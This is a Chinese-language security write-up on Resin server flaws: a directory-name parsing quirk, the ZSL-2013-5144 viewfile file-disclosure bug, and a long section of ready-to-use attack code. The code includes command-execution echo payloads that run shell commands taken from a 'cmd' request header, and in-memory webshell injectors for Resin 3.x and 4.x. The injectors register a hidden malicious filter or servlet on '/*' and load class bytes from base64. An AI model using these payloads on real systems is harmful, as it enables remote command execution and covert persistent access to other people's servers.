**目录**

- 0x01-支持.jspf后缀
- 0x02-类IIS6.0的解析漏洞
- 0x03-Resin 4.0.36 信息泄露漏洞(ZSL-2013-5144)
- 0x04-Resin 回显(已适配 3.x/4.x)
- 0x05-Resin 内存马(已适配 3.x/4.x)


### 0x01-支持.jspf后缀
配置文件

> E:\Resin\resin-4.0.65\conf\app-default.xml

![image](img/144174160-82c02d3b-a775-4b71-acaf-d9f03f2b3653-164000593249077.png)

可见Resin不仅支持.jsp、.jspx，也支持.jspf。

```jsp
<%
    response.getWriter().write("Hello Resin !!!");
%>
```
![image](img/144174179-d1e5af4c-c1cc-4f41-a5da-7fa2eb977b66-164000593053376.png)

### 0x02-类IIS6.0的解析漏洞

先看测试效果图

![image](img/144174242-db437f8b-0feb-4683-8e46-7e7586905a15-164000592925175.png)

希望传达的意思

- 若文件夹名为`xxx.jsp`，其中放置的任意后缀的文件都将被当作JSP文件解析。

#### 1、为什么会这样？

分三步跟一下http请求的处理过程，来到关键函数下个断点

- com.caucho.server.dispatch.UrlMap#map

**第1步：jsp文件**

![image](img/144174286-61ce59f9-da8f-47da-bb5a-60c65de85aab-164000592677374.png)

![image](img/144174296-2f6a4527-c1bb-4199-b5b9-d108216991bc-164000592521673.png)

正常进入jsp的解析逻辑

![image](img/144174317-03477b55-7f9c-4550-9e06-cb21fb4cd300-164000592371772.png)

**第2步：非jsp文件**

![image](img/144174351-15c3b0f6-df52-4c02-9322-bb0f76a3b2bf-164000592174971.png)

![image](img/144174357-ba30fda0-d499-4929-8234-f0778f09039b-164000592062570.png)

进入resin-file的处理逻辑

![image](img/144174378-bf20140b-fedf-4507-bef2-445187820ab2-164000591919169.png)

处理结果

![image](img/144174406-2259125d-b101-4073-94d5-01b8f9d67d96-164000591779667.png)

**第3步：x.jsp文件夹 + 非.jsp文件**

![image](img/144174432-3c2e4d49-7cc2-48ae-928e-60c9af933411-164000591588465.png)

![image](img/144174451-3cd87542-0dad-41de-ad7f-48a9359d8ef2-164000591406663.png)

![image](img/144174460-5f803d3c-8b6f-42e6-9f81-4def07970343-164000591286061.png)

也进入resin-file的处理逻辑

![image](img/144174477-b242ffb6-6d62-442c-98a7-ea6a7cb11206-164000591148059.png)

#### 2、造成这种处理差异的原理是什么？

![image](img/144174511-0cdabaf9-33c1-4c6e-aca5-c27c4ade0801-164000590875157.png)

map方法将会对url路径进行正则表达式，然后根据匹配结果进入不同的处理逻辑

> /hello.jsp

![image](img/144174547-64dc2dba-d06b-4591-8f01-3ad408648d96-164000590703855.png)

> /hello.hello

![image](img/144174573-43a536d0-d35f-40e2-8ecd-0b79f1d66723-164000590498553.png)

> /x.jsp/hello.hello

![image](img/144174584-858aca20-2946-4f46-808d-7da2c1b733ad-164000590275651.png)


### 0x03 Resin 4.0.36 信息泄露漏洞(ZSL-2013-5144)

- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5144.php

测试效果
> 读取index.jsp

![image](img/144178194-d2717d65-d9ed-4f3c-8903-4f4a624d848f-164000590059149.png)

> 读取resin-admin.xml

![image](img/144181449-d6b81379-429e-49a0-b02a-72c5c860b6d2-164000589886547.png)


#### 漏洞分析

从上面的分析中知道了可以从com.caucho.server.dispatch.UrlMap观察resin对http请求的处理逻辑，下断点调试

![image](img/144178592-1ee0f23f-5b67-4cd7-8dc4-a0437cb67168-164000589598845.png)

一路跟到`ServletMapping`

![image](img/144178671-718bf816-6494-4676-a40f-3b46d9f10c74-164000589357743.png)

很明显，到这里应该就知道漏洞成因估计是该版本的resin-web.xml默认添加了路由为/viewfile/*的servlet

文件位置
> E:\Resin\resin-pro-4.0.36\doc\resin-doc\WEB-INF\resin-web.xml

![image](img/144179072-662fff09-1c54-4ee2-a25b-923a542aaf40-164000589084541.png)

跟进对应的类
- com.caucho.doc.ViewFileServlet

![image](img/144179200-719d6a33-731d-402d-9907-cc15ea2ca4bf-164000587496637.png)


继续断点

![image](img/144179705-96c69246-482e-43d3-8d96-b3181bc2c07c-164000587935539.png)

然后通过viewFile打印文件内容

![image](img/144183728-c145ad4b-eca7-4ee1-866c-e6c039910117.png)


![image](img/144183814-9994ff06-4e7a-458b-92c1-c881e1834c82.png)

### 回显


#### Resin 4.x

​		在resin 4.X中跟一下如何获取response对象

- com.caucho.server.http.HttpRequest#handleRequest

  ![image-20220105153754258](img/image-20220105153754258.png)

- com.caucho.server.http.AbstractHttpRequest#getResponseFacade

  - 返回 response 对象

  ![image-20220105153911823](img/image-20220105153911823.png)

  所以如果能获取到AbstractHttpRequest对象并调用该对象的getResponseFacade方法，即可获取response对象。

​		获取AbstractHttpRequest对象，继承关系如下:

> CTRL + H

![image-20220105154711321](img/image-20220105154711321.png)



##### 基于 TcpSocketLink

> com.caucho.network.listen.TcpSocketLink

​		通过反射从`_currentRequest`获取到request对象

![image-20220105155432966](img/image-20220105155432966.png)

![image-20220105155510412](img/image-20220105155510412.png)

​		测试发现实际上获取到的request对象为HttpRequest类型，而HttpRequest继承自`AbstractHttpRequest`，则可以调用getResponseFacade()方法获取response对象

![image-20220105155805693](img/image-20220105155805693.png)



回显思路

- 通过调用TcpSocketLink.getCurrentRequest()获取ProtocolConnection对象（实际HttpRequest）
- 通过调用其父类(AbstractHttpRequest)的getResponseFacade方法获取response对象
- 通过反射调用reponse对象的getWriter方法获取PrintWriter对象
- 通过PrintWriter对象的write方法写入回显内容



代码实现

```java
// 获取TcpSocketLink Class对象
Class tcpSocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
// 通过反射调用getCurrentRequest方法 
Method getCurrentRequestM = tcpSocketLinkClazz.getMethod("getCurrentRequest");
Object currentRequest = getCurrentRequestM.invoke(null);
// 从父类(AbstractHttpRequest)中获取_responseFacade字段
Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
f.setAccessible(true);
// 获取response对象
Object response = f.get(currentRequest);
// 获取getWriter方法
Method getWriterM = response.getClass().getMethod("getWriter");
// 调用getWriter获取Writer对象
Writer writer = (Writer)getWriterM.invoke(response);
// 获取getHeader方法
Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
// 调用getHeader获取到通过需执行的命令：cmd
String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
// 执行命令
Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
// 写入命令执行结果并回显
writer.write(scanner.hasNext() ? scanner.next() : "");
```

##### 基于 ServletInvocation

- com.caucho.server.dispatch.ServletInvocation#getContextRequest

  - 获取ContextRequest对象

  ![image-20220105164537318](img/image-20220105164537318.png)

  - 实际获取到的为HttpServletRequestImpl对象

    ![image-20220105170110241](img/image-20220105170110241.png)

- com.caucho.server.http.HttpServletRequestImpl#_response

  - 获取到HttpServletRequestImpl对象后，通过_response字段获取到response对象。

  ![image-20220105170219120](img/image-20220105170219120.png)

  - 运行时截图

    ![image-20220105170612858](img/image-20220105170612858.png)



回显思路

- 反射调用ServletInvocation.getContextRequest()获取HttpServletRequestImpl对象
- 反射获取_response字段得到response对象
- 反射调用reponse对象的getWriter方法获取PrintWriter对象
- 通过PrintWriter对象的write方法写入需回显内容



代码实现

```java
// 反射调用ServletInvocation.getContextRequest()获取HttpServletRequestImpl对象
Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
// 反射获取_response字段（response对象）
Field _responseF = currentRequest.getClass().getDeclaredField("_response");
_responseF.setAccessible(true);
Object response = _responseF.get(currentRequest);
// 获取getWriter方法
Method getWriterM = response.getClass().getMethod("getWriter");
// 调用getWriter获取Writer对象
Writer writer = (Writer)getWriterM.invoke(response);
// 获取getHeader方法
Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
// 调用getHeader获取到通过需执行的命令：cmd
String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
// 执行命令
Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
// 写入命令执行结果并回显
writer.write(scanner.hasNext() ? scanner.next() : "");
```

#### Resin 3.x

​	在resin 3.X中跟一下如何获取response对象

- com.caucho.server.http.HttpRequest#handleRequest

  ![image-20220105161112694](img/image-20220105161112694.png)

- com.caucho.server.connection.AbstractHttpRequest#_response

  - response 对象

  ![image-20220105161306990](img/image-20220105161306990.png)

  所以如果能获取到AbstractHttpRequest对象，则可以反射获取该对象的_response字段（即response对象）。

  获取AbstractHttpRequest对象:

  ​		查看该类的继承关系，继承关系如下：

  > CTRL + H

![image-20220105161712914](img/image-20220105161712914.png)

##### 基于 ServletInvocation

> com.caucho.server.dispatch.ServletInvocation

- com.caucho.server.dispatch.ServletInvocation#getContextRequest

  - 返回ServletRequest对象

  ![image-20220105161958196](img/image-20220105161958196.png)

  - 实际获取到的为HttpRequest对象

    ![image-20220105171626526](img/image-20220105171626526.png)

- com.caucho.server.connection.AbstractHttpRequest#_response

  - 获取到HttpRequest对象，由于HttpRequest类中并没有保存_response对象，需要从父类AbstractHttpRequest中获取。

  ![image-20220105171905716](img/image-20220105171905716.png)

  - 运行时截图

    ```
    contextRequest.getClass().getSuperclass() -> com.caucho.server.connection.AbstractHttpRequest
    ```

    ![image-20220105172215180](img/image-20220105172215180.png)



回显思路

- 反射调用ServletInvocation.getContextRequest()获取HttpRequest对象
- 从父类AbstractHttpRequest中获取_response字段（response对象）
- 通过反射调用reponse对象的getWriter方法获取PrintWriter对象
- 通过PrintWriter对象的write方法写入需回显内容



代码实现

```java
// 获取ServletInvocation Class对象，反射调用getContextRequest方法获取ServletRequest对象
Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
// 从父类AbstractHttpRequest中获取response对象
Field _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
_responseF.setAccessible(true);
Object response = _responseF.get(currentRequest);
// 获取getWriter方法
Method getWriterM = response.getClass().getMethod("getWriter");
// 调用getWriter获取Writer对象
Writer writer = (Writer)getWriterM.invoke(response);
// 获取getHeader方法
Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
// 调用getHeader获取到通过需执行的命令：cmd
String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
// 执行命令
Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
// 写入命令执行结果并回显
writer.write(scanner.hasNext() ? scanner.next() : "");
```



#### Resin 3.x & 4.x 

> 多版本适配、已测试 3.1.16、4.0.65

##### 基于 ServletInvocation

> 细节参考以上

代码实现

```java
Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
Field _responseF;
if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
    // 3.x 需要从父类中获取
    _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
}else{
    _responseF = currentRequest.getClass().getDeclaredField("_response");
}
_responseF.setAccessible(true);
Object response = _responseF.get(currentRequest);
Method getWriterM = response.getClass().getMethod("getWriter");
Writer writer = (Writer)getWriterM.invoke(response);
Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
String cmd = (String)getHeaderM.invoke(contextRequest, "cmd");
Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
writer.write(scanner.hasNext() ? scanner.next() : "");
```

使用方法

```http
cmd: whoami
```

测试效果

![image-20220105191416860](img/image-20220105191416860.png)



### 0x05 Resin 内存马

#### Resin 3.x

> 内存马相关实现、本地测试版本：resin v3.1.16

##### WebApp

> 当前代码运行时上下文环境

配置`web.xml`

```xml
<servlet>
    <servlet-name>ServletShell</servlet-name>
    <servlet-class>com.example.general.ServletShell</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>ServletShell</servlet-name>
    <url-pattern>/index</url-pattern>
</servlet-mapping>
```

`com.example.general.ServletShell#doGet`方法处断点，获得相关的调用栈如下

![image-20220106131156977](img/image-20220106131156977.png)

逐步分析

- com.caucho.server.dispatch.ServletInvocation

  - 成员方法  getContextRequest()

    ![image-20220106132143479](img/image-20220106132143479.png)

    ```
    Object currentRequest = this.getClass().getMethod("getContextRequest").invoke(null);
    ```

    ![image-20220106132647928](img/image-20220106132647928.png)

    ```
    currentRequest.getClass() -> com.caucho.server.http.HttpRequest
    ```

    ![image-20220106132957181](img/image-20220106132957181.png)

- com.caucho.server.http.HttpRequest

  - 继承自 com.caucho.server.connection.AbstractHttpRequest

    - 成员方法 getWebApp()

      ![image-20220106142101670](img/image-20220106142101670.png)

      ```
      currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest) -> com.caucho.server.webapp.Application
      ```

      ![image-20220106142700706](img/image-20220106142700706.png)

- com.caucho.server.webapp.Application

  - 继承自 com.caucho.server.webapp.WebApp

    - 向上转换（upcasting），方便调用父类(WebApp)中定义的方法和变量

      ```
      WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
      ```

  可成功获取到当前web context(WebApp)。

- com.caucho.server.webapp.WebApp

  - 需要关注的成员方法

    - Filter

    ![image-20220106144849036](img/image-20220106144849036.png)

    - Listener

    ![image-20220106144905739](img/image-20220106144905739.png)

    - Servlet

    ![image-20220106144931512](img/image-20220106144931512.png)

  至此，针对不同类型的内存马调用相关的成员方法注入即可。



获取WebApp(当前上下文)的代码实现

```java
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
```

运行时截图

![image-20220106150529815](img/image-20220106150529815.png)

##### Filter

###### 基于 addFilterMapping

addFilterMapping

- com.caucho.server.webapp.WebApp#addFilterMapping

![image-20220106162933997](img/image-20220106162933997.png)



Filter 示例

![image-20220106172008396](img/image-20220106172008396.png)



Filter 配置

> 常用的方法就是先在web.xml中定义1个 filter demo，然后断点查看相关配置参数

- _filterName
- _filterClassName
- _filterClass
- _urlPattern
- ...

![image-20220106174307844](img/image-20220106174307844.png)



![image-20220106174411748](img/image-20220106174411748.png)

注入思路

- 获取当前环境的WebApp(上下文)

- 构造filterMapping，添加`相关配置`

  ```
  filterMapping.setFilterClass();
  filterMapping.setFilterName();
  FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
  urlPattern.addText(urlPatternX);
  urlPattern.init();
  ```

- 调用成员方法addFilterMapping添加该filterMapping即可



代码实现

```java
String filterName = "evilFilter";
String urlPatternX = "/resin/*";
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = (WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
Class evilClazz = classLoader.loadClass("com.example.general.FilterShell");
FilterMapping filterMapping = new FilterMapping();
filterMapping.setFilterClass(evilClazz.getName());
filterMapping.setFilterName(filterName);
FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
urlPattern.addText(urlPatternX);
urlPattern.init();
webApp.addFilterMapping(filterMapping);
response.getWriter().write("inject success");
```



测试效果

![image-20220106172127259](img/image-20220106172127259.png)



ps: resin下会报异常如下(`有师傅知道为啥嘛，求指点`)

> java.lang.IllegalStateException: sendError() forbidden after buffer has been committed.

##### Servlet

###### 基于 addServletMapping

addServletMapping

- com.caucho.server.webapp.WebApp#addFilterMapping

![image-20220106171354262](img/image-20220106171354262.png)



Servlet 示例

![image-20220106164513466](img/image-20220106164513466.png)



Servlet 配置

> 常用的方法就是先在web.xml中定义1个 servlet demo，断点查看相关配置参数

- _servletName
- _servletClassName
- _servletClass
- ...

![image-20220106173607433](img/image-20220106173607433.png)

注入思路

- 获取当前环境的WebApp(上下文)

- 构造servletMapping，添加相关配置

  ```
  servletMapping.setServletClass();
  servletMapping.setServletName();
  servletMapping.addURLPattern();
  ```

- 调用成员方法addServletMapping添加该servletMapping即可



代码实现

```java
String servletName = "evilServlet";
String urlPatternX = "/resin/*";
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class<?> servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object servletRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = (WebApp) servletRequest.getClass().getMethod("getWebApp").invoke(servletRequest);
Class evilClazz = classLoader.loadClass("com.example.general.ServletShell");
ServletMapping servletMapping = new ServletMapping();
servletMapping.setServletClass(evilClazz.getName());
servletMapping.setServletName(servletName);
servletMapping.addURLPattern(urlPatternX);
webApp.addServletMapping(servletMapping);
response.getWriter().write("inject success");
```



测试效果

![image-20220106164158028](img/image-20220106164158028.png)



#### Resin 3.x & 4.x

##### Filter

resin 4.x 内存马的相关实现步骤与3.x没有太大的区别，这里直接给出已适配 resin  3.x & 4.x 的Filter型内存马

```java
/**
 * Tested version：
 *      resin3.1.16
 *      resin4.0.65
 *
 */
public class ResinFilterInject extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String filterName = "evilFilter";
            String urlPatternX = "/*";
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            // com.caucho.server.dispatch.ServletInvocation.getContextRequest
            Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object currentRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            // com.caucho.server.connection.AbstractHttpRequest.getWebApp
            WebApp webApp = (WebApp) currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
            // com.caucho.server.webapp.WebApp._filterManager
            Field _filterManager = null;
            try {
                _filterManager = webApp.getClass().getDeclaredField("_filterManager");
            }catch (Exception e){
                _filterManager = webApp.getClass().getSuperclass().getDeclaredField("_filterManager");
            }
            _filterManager.setAccessible(true);
            FilterManager filterManager = (FilterManager) _filterManager.get(webApp);
            // com.caucho.server.dispatch.FilterManager._filters
            Field _filtersF = filterManager.getClass().getDeclaredField("_filters");
            _filtersF.setAccessible(true);
            Map _filters = null;
            try{
                // resin3.1.16: Hashtable<String, FilterConfigImpl> _filters = new Hashtable();
                _filters  = (Hashtable<String, FilterConfigImpl>) _filtersF.get(filterManager);
            }catch (Exception e){
                // resin4.0.65: HashMap<String, FilterConfigImpl> _filters = new HashMap();
                _filters = (HashMap<String, FilterConfigImpl>) _filtersF.get(filterManager);
            }
            // prevent multiple injection
            if(!_filters.containsKey(filterName)){
                Class evilClazz = null;
                try {
                    evilClazz = classLoader.loadClass("com.example.general.FilterShell");
                } catch (ClassNotFoundException e) {
                    BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
                    byte[] evilFilterBytes = b64Decoder.decodeBuffer("yv66vg......");
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    evilClazz = (Class) defineClass.invoke(classLoader, evilFilterBytes, 0, evilFilterBytes.length);
                }
                FilterMapping filterMapping = new FilterMapping();
                filterMapping.setFilterClass(evilClazz.getName());
                filterMapping.setFilterName(filterName);
                FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
                urlPattern.addText(urlPatternX);
                urlPattern.init();
                webApp.addFilterMapping(filterMapping);
                response.getWriter().write("inject success");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

web.xml

![image-20220106180420193](img/image-20220106180420193.png)

测试效果

![image-20220106180350585](img/image-20220106180350585.png)



